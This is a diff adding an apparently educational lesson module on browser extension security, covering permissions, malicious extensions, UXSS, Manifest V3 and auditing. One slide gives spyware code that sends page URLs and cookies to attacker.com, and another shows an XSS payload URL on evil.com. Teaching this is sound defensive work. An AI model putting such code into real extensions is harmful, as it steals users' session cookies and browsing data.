@@ -1,0 +1,119 @@
+{
+    "id": "learn_extension_security",
+    "topicId": "extension_security",
+    "topicTitle": "Browser Extension Security",
+    "description": "Examine the security model of browser extensions, permissions, and how malicious extensions operate.",
+    "baseKP": 100,
+    "slides": [
+        {
+            "id": "extensions_intro_1",
+            "type": "content",
+            "title": "Extensions: The Double-Edged Sword",
+            "content": "# Power & Responsibility 🗡️\n\nExtensions (Add-ons) extend browser functionality. To do this, they often need privileged access.\n\n## The Risk\nAn extension can often:\n-   Read all data on all websites (including banks).\n-   Inject scripts into pages.\n-   Modify network requests."
+        },
+        {
+            "id": "manifest_permissions",
+            "type": "content",
+            "title": "Manifest & Permissions",
+            "content": "# The Manifest File 📜\n\n`manifest.json` defines what an extension can do.\n\n## Dangerous Permissions\n-   `\"<all_urls>\"`: Can access every page you visit.\n-   `\"webRequest\"`: Can intercept and modify traffic.\n-   `\"cookies\"`: Can access session cookies (even HttpOnly ones).\n-   `\"tabs\"`: Can see what you are browsing."
+        },
+        {
+            "id": "malicious_extensions_1",
+            "type": "content",
+            "title": "Malicious Extensions",
+            "content": "# Malware in the Store 🛍️\n\nAttackers publish helpful-looking extensions (calculators, VPNs) that contain malware.\n\n## Tactics\n-   **Data Harvesting**: Silently upload browsing history to a C2 server.\n-   **Ad Injection**: Replace website ads with the attacker's ads.\n-   **Amazon Affiliate Fraud**: Inject affiliate cookies when you visit stores."
+        },
+        {
+            "id": "malice_code",
+            "type": "content",
+            "title": "Malicious Script Concept",
+            "content": "# Extension Spyware 🕸️\n\n```javascript\n// content_script.js - runs on every page\nchrome.runtime.sendMessage(\n    {url: document.location.href, cookies: document.cookie}\n);\n\n// background.js - sends to attacker\nchrome.runtime.onMessage.addListener((msg) => {\n    fetch(\"https://attacker.com/log\", {\n        method: \"POST\",\n        body: JSON.stringify(msg)\n    });\n});\n```"
+        },
+        {
+            "id": "extension_quiz",
+            "type": "quiz",
+            "title": "Permissions Quiz",
+            "content": "Check your permission knowledge.",
+            "quizQuestion": "Which permission allows an extension to read data on any website?",
+            "quizOptions": [
+                "\"activeTab\"",
+                "\"storage\"",
+                "\"<all_urls>\"",
+                "\"unlimitedStorage\""
+            ],
+            "correctOptionIndex": 2
+        },
+        {
+            "id": "takeover_updates",
+            "type": "content",
+            "title": "Extension Takeover",
+            "content": "# Sold to the Highest Bidder 💸\n\n## The Scenario\n1.  Developer builds a popular extension (1M users).\n2.  Developer gets bored/broke.\n3.  Sketchy company offers $20,000 for the extension.\n4.  Developer sells control.\n5.  Company pushes an auto-update containing spyware.\n6.  **Result**: 1M users compromised overnight."
+        },
+        {
+            "id": "csp_extensions",
+            "type": "content",
+            "title": "Extensions & CSP",
+            "content": "# Bypassing CSP 🧱\n\nNormally, a website's CSP protects it.\n`Content-Security-Policy: script-src 'self'`\n\n## The Exception\nBrowser extensions (content scripts) are often **exempt** from the page's CSP. They can inject whatever they want into the DOM.\n\n> ⚠️ **Risk**: A malicious extension can bypass the most secure banking site's headers."
+        },
+        {
+            "id": "extension_fingerprinting",
+            "type": "content",
+            "title": "Extension Fingerprinting",
+            "content": "# Identifying Your Extensions 🕵️\n\nWebsites can detect what extensions you have installed.\n\n## Method\nExtensions expose \"Web Accessible Resources\" (images, scripts).\n-   Site tries to load `chrome-extension://[ID]/logo.png`.\n-   If it loads, the extension is installed.\n-   **Privacy Risk**: Unique combination of extensions = Unique Fingerprint."
+        },
+        {
+            "id": "extension_vulns",
+            "type": "content",
+            "title": "Vulnerabilities IN Extensions",
+            "content": "# Hacking the Extension 🔧\n\nExtensions themselves can have XSS.\n\n## Universal XSS (UXSS)\nIf an extension takes data from a website and renders it unsafe in its popup/options page, a malicious website can exploit the extension to execute code in the browser's privileged context (or other tabs)."
+        },
+        {
+            "id": "uxss_code",
+            "type": "content",
+            "title": "UXSS Example",
+            "content": "# UXSS Concept 💥\n\n```javascript\n// Extension code (popup.js)\nlet url = await getActiveTabUrl();\n// Vulnerable: innerHTML\ndocument.body.innerHTML = \"Current URL: \" + url;\n```\n\n**Attack**: Attacker hosts a page with URL: `http://evil.com/#<script>alert(1)</script>`\nWhen user opens the extension popup, the script runs with extension privileges."
+        },
+        {
+            "id": "native_messaging",
+            "type": "content",
+            "title": "Native Messaging",
+            "content": "# Breaking the Sandbox 📦\n\nExtensions can talk to native apps on the OS via `Native Messaging`.\n\n## Risk\nIf an extension has a vulnerability and uses Native Messaging, an attacker can escalate from **Web -> Extension -> OS Shell Execution**."
+        },
+        {
+            "id": "manifest_v3",
+            "type": "content",
+            "title": "Manifest V3",
+            "content": "# Manifest V3 🆕\n\nGoogle's new extension platform rules.\n\n## Changes\n-   Removes remote code execution (no `eval` in background).\n-   Replaces `webRequest` (blocking) with `declarativeNetRequest`.\n-   **Goal**: Better privacy and performance, harder for malware to function.\n-   **Controversy**: Limits capabilities of ad blockers."
+        },
+        {
+            "id": "secure_dev_extensions",
+            "type": "content",
+            "title": "Secure Development",
+            "content": "# Developing Secure Extensions 🛡️\n\n1.  **Least Privilege**: Only ask for permissions you strictly need (`activeTab` instead of `all_urls`).\n2.  **No Eval**: Do not execute strings as code.\n3.  **Content Scripts**: Handle data from the DOM as untrusted.\n4.  **Updates**: Keep libraries updated."
+        },
+        {
+            "id": "auditing_extensions",
+            "type": "content",
+            "title": "Auditing Extensions",
+            "content": "# CRXcavator 🔍\n\nTools to assess extension risk.\n\n-   **CRXcavator**: Automated security scanning for Chrome Extensions.\n-   **Browser Tools**: `chrome://extensions` -> Developer Mode -> Inspect Views.\n-   **Source Code**: Download `.crx` file, unzip, and read the JS."
+        },
+        {
+            "id": "extension_testing_code",
+            "type": "content",
+            "title": "Dumping Extension Source",
+            "content": "# Extracting CRX 🐍\n\nExtensions are just ZIP files.\n\n```bash\nunzip extension.crx -d source_code/\ngrep -r \"chrome.permissions\" source_code/\n```\n\n<!-- FULL_CODE_START\nprint(\"=== Extension Analysis Concept ===\")\nprint(\"Extensions are ZIP archives containing HTML/JS/CSS and a manifest.json.\")\n\ndef analyze_manifest(manifest_json):\n    print(\"\\n[*] Analyzing Manifest Permissions...\")\n    permissions = manifest_json.get(\"permissions\", [])\n    \n    risky = [\"<all_urls>\", \"webRequest\", \"cookies\", \"tabs\", \"history\"]\n    found_risks = [p for p in permissions if p in risky]\n    \n    if found_risks:\n        print(f\"[!] HIGH RISK Permissions found: {found_risks}\")\n    else:\n        print(\"[+] Permissions look scoped.\")\n\n# Mock Manifest\nmanifest = {\n    \"name\": \"Super VPN\",\n    \"version\": \"1.0\",\n    \"permissions\": [\n        \"storage\",\n        \"<all_urls>\",\n        \"webRequest\",\n        \"webRequestBlocking\"\n    ]\n}\n\nanalyze_manifest(manifest)\nFULL_CODE_END -->"
+        },
+        {
+            "id": "enterprise_policy",
+            "type": "content",
+            "title": "Enterprise Control",
+            "content": "# Corporate Defense 🏢\n\nAdmins can control extensions via Group Policy.\n\n-   **Blocklist**: Block specific IDs.\n-   **Allowlist**: Block *everything* except approved ID.\n-   **ForceInstall**: Automatically install security tools.\n-   **Blocks**: `ExtensionSettings` policy."
+        },
+        {
+            "id": "extension_summary",
+            "type": "content",
+            "title": "Module Summary",
+            "content": "# Wrap Up 🎁\n\n-   **Privacy**: Extensions see everything.\n-   **Malware**: The store is not perfectly curated.\n-   **Fingerprinting**: Extensions make you trackable.\n-   **V3**: The future is more restrictive but potentially safer.\n\nBe minimalist with your extensions!"
+        }
+    ]
+}
